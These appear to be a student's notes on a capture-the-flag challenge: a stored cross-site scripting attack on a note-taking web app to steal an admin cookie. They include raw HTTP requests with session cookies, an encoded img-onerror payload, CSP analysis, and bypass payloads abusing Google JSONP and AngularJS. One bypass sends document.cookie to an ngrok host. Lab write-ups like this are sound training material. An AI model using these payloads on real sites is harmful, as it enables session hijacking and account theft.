100 points at `http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/`

Ah hah, this is gonna be one of those "steal admin cookies" ones
![[Pasted image 20240409132423.png]]

Here's what I think development will look like:
1) Build payload that will send cookie to Collaborator (or something)
2) Test payload against other account
3) Reporting will send payload to admin so that it is viewed by the other one

# 1) Building Payload Against User
## Note View Functionality
It returns the note title and contents in plaintext
###### Request:
```http
GET /note/view/2 HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:12345
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/
Cookie: CHALBROKER_USER_ID=lmv9443; session=.eJwlzjEOwjAMRuG7ZGZw4jqJe5kqsf8IJKa0ZUHcnSK2N7zhe4dtTOz3sB7zxC1sDw9riCTaLWfrzuaUBzVtTENgA7HUVAec4L0snHIzUk8cJSv1X7gN9VbBXSEtgrh1uCCBuVy7tBp7gS0lCY9ixDWLMmtaiD2KhQty7ph_zfN1YD_C5wsmrTJV.ZhWKTA.gNykmC9pUxydFz5BGWzAwwMmNDM
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: green
```
###### Response:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2483
Content-Security-Policy: script-src 'self' cdn.jsdelivr.net *.google.com; img-src *; default-src 'self'; style-src 'self' cdn.jsdelivr.net; report-uri /csp_report
Vary: Cookie
Server: Werkzeug/2.0.3 Python/3.6.9
Date: Tue, 09 Apr 2024 18:41:11 GMT
...omitted for brevity
<!DOCTYPE html>
<html lang="en">
    <head>       
        <title>Nevernote</title>
    ...omitted for brevity...
    <div class="container-fluid">
        <div class="content">
			<h3>This is a test by lvtest</h3>
			<p>This is a test</p>
```

So we can see that the csp is shown in the response, which only allows scripts from itself (luckily I can upload probably all content)
* It does allow images from all sources

## Simple Image Payload

Just getting syntax
Image URL: `https://i.ebayimg.com/images/g/e8EAAOSwuZxhzIsD/s-l1600.jpg`
```
<img src = "https://i.ebayimg.com/images/g/e8EAAOSwuZxhzIsD/s-l1600.jpg"/>
```



```
test</p><img src = "https://i.ebayimg.com/images/g/e8EAAOSwuZxhzIsD/s-l1600.jpg"/><p>test
```


It looks like none of my images are showing up for some reason, I think the csp
##### So here's a simple img on error payload just to see
###### Payload:
```js
<img src="doesnotexist.jpg" onerror="javascript:alert("Hello")" />
```
Encoded: 
```
%3c%69%6d%67%20%73%72%63%3d%22%64%6f%65%73%6e%6f%74%65%78%69%73%74%2e%6a%70%67%22%20%6f%6e%65%72%72%6f%72%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%22%48%65%6c%6c%6f%22%29%22%20%2f%3e
```
###### Request to Set Payload:
```http
POST /note/new HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:12345
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 233
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:12345
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new
Cookie: CHALBROKER_USER_ID=lmv9443; session=.eJwlzjEOwjAMRuG7ZGZw4jqJe5kqsf8IJKa0ZUHcnSK2N7zhe4dtTOz3sB7zxC1sDw9riCTaLWfrzuaUBzVtTENgA7HUVAec4L0snHIzUk8cJSv1X7gN9VbBXSEtgrh1uCCBuVy7tBp7gS0lCY9ixDWLMmtaiD2KhQty7ph_zfN1YD_C5wsmrTJV.ZhWRMg.v2BkA2UEQwahAYzizyv8G_0WGdY
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: green

title=ImgAlert&content=%3c%69%6d%67%20%73%72%63%3d%22%64%6f%65%73%6e%6f%74%65%78%69%73%74%2e%6a%70%67%22%20%6f%6e%65%72%72%6f%72%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%22%48%65%6c%6c%6f%22%29%22%20%2f%3e&submit=save
```

###### Request to view payload:
```http
GET /note/view/4 HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:12345
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/
Cookie: CHALBROKER_USER_ID=lmv9443; session=.eJwlzjEOwjAMRuG7ZGZw4jqJe5kqsf8IJKa0ZUHcnSK2N7zhe4dtTOz3sB7zxC1sDw9riCTaLWfrzuaUBzVtTENgA7HUVAec4L0snHIzUk8cJSv1X7gN9VbBXSEtgrh1uCCBuVy7tBp7gS0lCY9ixDWLMmtaiD2KhQty7ph_zfN1YD84fL5Y_DKI.ZhWQ7A.pgUEreeSN73YDm0pAKwBi9AxmW4
Upgrade-Insecure-Requests: 1
X-PwnFox-Color: red
```
###### Response:
```html
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2530
Content-Security-Policy: script-src 'self' cdn.jsdelivr.net *.google.com; img-src *; default-src 'self'; style-src 'self' cdn.jsdelivr.net; report-uri /csp_report
Vary: Cookie
Server: Werkzeug/2.0.3 Python/3.6.9
Date: Tue, 09 Apr 2024 19:21:34 GMT

...omitted for brevity...

<main role="main">
    <div class="container-fluid">
        <div class="content">
            
    <h3>ImgAlert by lvtest</h3>
    <p><img src="doesnotexist.jpg" onerror="javascript:alert("Hello")" /></p>

        </div>
    </div>
</main>
```

This also got me a csp warning when I clicked on it...I guess because of the script, but I realize now that my quotes are weird

Same thing happened with better quotes too ...weird


Anyways, this is because of the CSP
CSP:
```
Content-Security-Policy: script-src 'self' cdn.jsdelivr.net *.google.com; img-src *; default-src 'self'; style-src 'self' cdn.jsdelivr.net; report-uri /csp_report
```

Most importantly, how it's getting scripts:
```
script-src 'self' cdn.jsdelivr.net *.google.com;
```
So scripts can come from:
* self
* cdn.jsdelivr.net
* google.com

Here's what a CSP evaluator says
![[Pasted image 20240409145523.png]]
Self
* would probably need to upload a js file itself


```
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```


```
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

